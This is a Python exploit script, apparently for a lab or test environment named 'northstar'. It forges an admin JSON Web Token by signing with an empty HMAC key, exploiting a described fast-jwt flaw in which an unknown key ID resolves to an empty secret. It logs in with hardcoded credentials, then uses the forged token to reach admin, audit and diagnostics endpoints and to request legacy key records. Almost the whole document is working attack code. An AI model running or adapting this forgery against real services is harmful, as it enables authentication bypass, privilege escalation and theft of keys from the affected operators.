"""Forge an admin JWT via CVE-2026-44351 (fast-jwt 6.2.3 empty HMAC secret).

Unknown kid -> async resolver returns '' -> HMAC-SHA256 with empty key accepted.
"""
import base64
import hashlib
import hmac
import json
import os
import time

import requests

BASE = os.environ["NORTHSTAR_BASE"].rstrip("/")
USERNAME = os.environ.get("NORTHSTAR_USER", "analyst@northstar.test")
PASSWORD = os.environ.get("NORTHSTAR_PASS", "Curve-Review-2026")


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def forge(payload_extra=None, kid="no-such-kid-000"):
    now = int(time.time())
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    payload = {
        "aud": "northstar-docs",
        "exp": now + 7200,
        "iat": now,
        "iss": "northstar-auth",
        "role": "admin",
        "scope": ["projects:read", "reports:read", "keys:read", "admin", "diagnostics", "audit"],
        "sub": "analyst@northstar.test",
    }
    if payload_extra:
        payload.update(payload_extra)
    signing_input = b64url(json.dumps(header, separators=(",", ":")).encode()) + "." + \
        b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64url(hmac.new(b"", signing_input.encode(), hashlib.sha256).digest())
    return signing_input + "." + sig


def main():
    s = requests.Session()
    r = s.post(BASE + "/api/v1/login", json={
        "username": USERNAME,
        "password": PASSWORD,
    }, timeout=20)
    print("login", r.status_code)
    real = r.json()["token"]
    import base64 as _b
    payload = real.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    print("real payload:", _b.urlsafe_b64decode(payload).decode())

    tok = forge()
    print("forged token:", tok)
    H = {"Authorization": "Bearer " + tok}
    for path in ("/api/v1/me", "/api/v1/projects/prj-northstar/audit",
                 "/api/v1/diagnostics/quota"):
        resp = s.get(BASE + path, headers=H, timeout=20)
        print("GET", path, resp.status_code, resp.text[:800].replace("\n", " "))
    print("--- diagnostics compat ---")
    for key_id in ("legacy-rotated-05", "legacy-rotated-06", "legacy-android-01",
                   "legacy-browser-02", "legacy-rn-03", "legacy-browser-04"):
        resp = s.post(BASE + "/api/v1/diagnostics/compat", headers=H,
                      json={"key_id": key_id}, timeout=30)
        print("POST compat", key_id, resp.status_code, resp.text[:1500].replace("\n", " "))


if __name__ == "__main__":
    main()
